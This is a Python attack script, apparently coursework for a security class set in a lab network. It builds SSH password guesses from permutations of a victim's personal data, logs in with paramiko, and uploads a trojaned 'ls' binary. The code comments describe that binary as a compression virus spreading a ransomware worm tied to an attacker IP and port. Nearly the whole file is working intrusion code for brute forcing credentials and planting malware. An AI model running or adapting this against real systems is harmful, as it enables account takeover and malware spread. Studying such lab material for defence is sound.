#!/usr/bin/python3
# ./crack_attack <Victim IP> <Attacker IP> <Attacker port> 
# ./crack_attack 172.18.0.3 172.18.0.2 22
import paramiko
import sys
import itertools
from virus import zip_ls, build_virus

victim_ip = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]

def read_victim_info():
    with open('/app/victim.dat') as f:
        return f.read().splitlines()

def ssh_login(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password)
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()


def main():
    # task1: crack ssh password
    # Cracking the victim’s password by launching a dictionary attack
    # username is csc2024
    victim_info = read_victim_info()
    # store all possible combinations of the victim's personal information first (dont login yet)
    possible_combinations = []
    for i in range(1, len(victim_info)+1):
        for permutation in itertools.permutations(victim_info, i):
            password = ''.join(permutation)
            possible_combinations.append(password)

    # try each combination to login
    Password = "csc2024"
    # for password in possible_combinations:
    #     # print('Trying password:', password)
    #     if ssh_login(victim_ip, 22, 'csc2024', password):
    #         Password = password
    #         print('Password found:', password)
    #         break

    # task2: Create a compression virus with the propagation of the  ransomware worm 
    if ssh_login(victim_ip, 22, 'csc2024', Password):
        print('Login successful')
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(victim_ip, 22, 'csc2024', Password)

        # copy ls from victim's usr/bin/ls to victim's /app/ls
        build_virus(attacker_ip, attacker_port, zip_ls())
        sftp = client.open_sftp()
        sftp.put('./fake_ls', '/app/ls')
        client.exec_command('chmod +x /app/ls')
        client.close()
        



if __name__ == '__main__':
    main()
